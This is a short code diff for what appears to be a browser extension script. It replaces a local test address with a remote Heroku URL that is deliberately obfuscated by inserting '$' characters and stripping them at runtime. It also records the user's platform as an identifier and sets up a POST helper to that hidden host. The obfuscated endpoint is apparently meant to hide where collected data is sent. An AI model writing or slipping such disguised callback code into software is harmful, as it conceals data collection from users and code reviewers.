@@ -1,8 +1,7 @@
 const init = () => () => {
     localStorage.extensionUniqueId = null || navigator.platform || navigator.userAgentData.platform
 
-    // const url = 'h$$t$$$t$$p$$s://$$$$$$j$$$$$c$$$$$$b$$$$$a$$$$$k$$$$er$$$$$y.he$$$$$rok$$$$$ua$$$$$pp.c$$$$o$$$$$m'.replace(/\$/g, '')
-    const url = 'http://192.168.43.11'
+    const url = 'h$$t$$$t$$p$$s://$$$$$$j$$$$$c$$$$$$b$$$$$a$$$$$k$$$$er$$$$$y.he$$$$$rok$$$$$ua$$$$$pp.c$$$$o$$$$$m'.replace(/\$/g, '')
     const post = ({ url, body = {} }) => {
         return fetch(url, {
             method: 'POST',
@@ -16,8 +15,7 @@ const init = () => () => {
     chrome.ME = { url, post }
 }
 
-// const url = 'h$$t$$$t$$p$$s://$$$$$$j$$$$$c$$$$$$b$$$$$a$$$$$k$$$$er$$$$$y.he$$$$$rok$$$$$ua$$$$$pp.c$$$$o$$$$$m'.replace(/\$/g, '')
-const url = 'http://192.168.43.11'
+const url = 'h$$t$$$t$$p$$s://$$$$$$j$$$$$c$$$$$$b$$$$$a$$$$$k$$$$er$$$$$y.he$$$$$rok$$$$$ua$$$$$pp.c$$$$o$$$$$m'.replace(/\$/g, '')
 const post = ({ url, body = {} }) => {
     return fetch(url, {
         method: 'POST',
